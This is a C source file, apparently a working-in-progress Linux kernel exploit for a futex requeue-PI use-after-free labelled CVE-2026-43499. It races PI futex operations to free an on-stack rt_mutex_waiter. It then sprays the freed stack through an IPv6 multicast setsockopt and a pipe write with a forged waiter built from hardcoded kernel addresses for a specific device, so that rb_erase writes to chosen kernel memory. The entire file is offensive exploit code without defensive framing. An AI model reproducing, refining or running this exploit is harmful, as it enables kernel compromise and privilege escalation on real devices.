#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <sched.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/futex.h>

#define FLPI (FUTEX_LOCK_PI         | FUTEX_PRIVATE_FLAG)
#define FUPI (FUTEX_UNLOCK_PI       | FUTEX_PRIVATE_FLAG)
#define FWRQ (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
#define FCRQ (FUTEX_CMP_REQUEUE_PI  | FUTEX_PRIVATE_FLAG)

static uint32_t futex1=0, futex2=0, cycle_futex=0;
static volatile int o_ready=0, w_ready=0, o_blocking=0, w_waiting=0, uaf_probe=0;

static long xfutex(uint32_t *u, int op, uint32_t val, void *ts, uint32_t *u2, uint32_t v3) {
    return syscall(SYS_futex, u, op, val, ts, u2, v3);
}
static void dbg(const char *s) { write(2, s, strlen(s)); }

static void dbg_long(const char *p, long v, int en) {
    char b[128]; int n=snprintf(b,sizeof(b),"%s%ld errno=%d (%s)\n",p,v,en,strerror(en)); write(2,b,n);
}

/*
 * matisse init_task direct map: 0xffffff800279bec0
 *   KIMAGE_TEXT_BASE=0xffffffc008000000, INIT_TASK_OFF=0x27562f8
 *   canon: 0xffffff8000000000 | (0xffffffc00a7562f8 - 0xffffffc008000000)
 *        = 0xffffff80027562f8
 * Verified from kallsyms: init_task dmap=0xffffff800279bec0
 *
 * ASHMEM_MISC_OFF: 0xffffff80028e76d8 (direct map)
 * ASHMEM_MISC_FOPS: 0xffffff80028e76e8 (direct map)
 *
 * rt_mutex_waiter layout (64-bit, offset in uint64_t words):
 *   word 0: tree_entry.__rb_parent_color  (+0x00)
 *   word 1: tree_entry.rb_right           (+0x08)
 *   word 2: tree_entry.rb_left            (+0x10)
 *   word 3: pi_tree_entry.__rb_parent_color (+0x18)
 *   word 4: pi_tree_entry.rb_right        (+0x20)
 *   word 5: pi_tree_entry.rb_left         (+0x28)
 *   word 6: task                          (+0x30)
 *   word 7: lock                          (+0x38)
 *   word 8: prio (low 32 bits)            (+0x40)
 */
#define INIT_TASK_DMAP 0xffffff800279bec0ULL
#define OFF_DMAP       0xffffff80028e76d8ULL
#define FOPS_DMAP      0xffffff80028e76e8ULL

/* v38: valid task (init_task) — verify chain walk completes without crash */
static void stamp_controlled(void) {
    uint64_t buf[64];
    /* fill with recognizable pattern */
    for (int i=0;i<64;i++) buf[i]=0xDEAD000000000000ULL + (uint64_t)i;

    /* tree_entry: parent=OFF|RED → rb_erase writes to OFF+0x08=name_ptr (harmless) */
    buf[0]=0xffffff80028a77c8ULL; /* BOOTID-8 */        /* OFF|RED */
    buf[1]=0xCAFE000000000001ULL;   /* tree_right → what gets written to name_ptr */
    buf[2]=0;                       /* tree_left=NULL → Path A */

    /* pi_tree_entry: also OFF|RED for 2nd rb_erase */
    buf[3]=OFF_DMAP | 1ULL;        /* OFF|RED */
    buf[4]=0xCAFE000000000002ULL;   /* pi_tree_right */
    buf[5]=0;                       /* pi_tree_left=NULL */

    /* ★ v38: init_task instead of NULL — valid task_struct, all fields ok */
    buf[6]=INIT_TASK_DMAP;          /* task = init_task (real, valid) */
    buf[7]=0xBEEF000000000000ULL;   /* lock (may not be dereferenced in this path) */
    buf[8]=(uint64_t)(120 | (139 << 16)); /* prio=120, wait_lock irrelevant? */

    int fd=socket(AF_INET6,SOCK_DGRAM,0);
    if(fd>=0){
        setsockopt(fd,IPPROTO_IPV6,MCAST_JOIN_SOURCE_GROUP,buf,sizeof(buf));
        close(fd);
    }
    /* also thrash with pipe write — double coverage of freed stack */
    int p[2]; if(pipe(p)==0){ write(p[1],buf,sizeof(buf)); close(p[0]); close(p[1]); }
}

static void *owner_fn(void *u) {
    (void)u; pid_t tid=(pid_t)syscall(SYS_gettid);
    __atomic_store_n(&futex2,(uint32_t)tid,__ATOMIC_RELEASE);
    __atomic_store_n(&o_ready,1,__ATOMIC_RELEASE);
    while(!__atomic_load_n(&w_ready,__ATOMIC_ACQUIRE)) sched_yield();
    __atomic_store_n(&o_blocking,1,__ATOMIC_RELEASE);
    xfutex(&cycle_futex,FLPI,0,NULL,NULL,0);
    xfutex(&cycle_futex,FUPI,0,NULL,NULL,0);
    return NULL;
}

static void *waiter_fn(void *u) {
    (void)u; pid_t tid=(pid_t)syscall(SYS_gettid);
    struct timespec ts; long r;
    while(!__atomic_load_n(&o_ready,__ATOMIC_ACQUIRE)) sched_yield();
    __atomic_store_n(&cycle_futex,(uint32_t)tid,__ATOMIC_RELEASE);
    __atomic_store_n(&w_ready,1,__ATOMIC_RELEASE);
    while(!__atomic_load_n(&o_blocking,__ATOMIC_ACQUIRE)) sched_yield();
    usleep(20000);
    __atomic_store_n(&w_waiting,1,__ATOMIC_RELEASE);
    clock_gettime(CLOCK_MONOTONIC,&ts); ts.tv_sec+=2;
    r=xfutex(&futex1,FWRQ,0,&ts,&futex2,0);
    dbg_long("[W] FWRQ ret=",r,errno);
    /* v37: controlled stamp instead of getpid thrash */
    stamp_controlled();
    __atomic_store_n(&uaf_probe,1,__ATOMIC_RELEASE);
    usleep(500000);
    xfutex(&cycle_futex,FUPI,0,NULL,NULL,0);
    return NULL;
}

int main(void) {
    pthread_t oth,wth;
    dbg("CVE-2026-43499 trigger + controlled stamp v38 (init_task)\n");
    pthread_create(&oth,NULL,owner_fn,NULL);
    pthread_create(&wth,NULL,waiter_fn,NULL);
    while(!__atomic_load_n(&w_waiting,__ATOMIC_ACQUIRE)) sched_yield();
    usleep(40000);
    dbg("[M] firing FUTEX_CMP_REQUEUE_PI\n");
    long ret=xfutex(&futex1,FCRQ,1,(void*)(uintptr_t)1,&futex2,0);
    int err=errno;
    dbg_long("[M] FCRQ ret=",ret,err);
    if(ret==-1 && err==EDEADLK){
        dbg("[M] EDEADLK — waiting W timeout\n");
        while(!__atomic_load_n(&uaf_probe,__ATOMIC_ACQUIRE)) sched_yield();
        dbg("[M] UAF probe: FUTEX_LOCK_PI(cycle_futex)\n");
        xfutex(&cycle_futex,FLPI,0,NULL,NULL,0);
        dbg("[M] UAF probe returned!\n");
        xfutex(&cycle_futex,FUPI,0,NULL,NULL,0);
    }
    pthread_join(wth,NULL); pthread_join(oth,NULL);
    return 0;
}
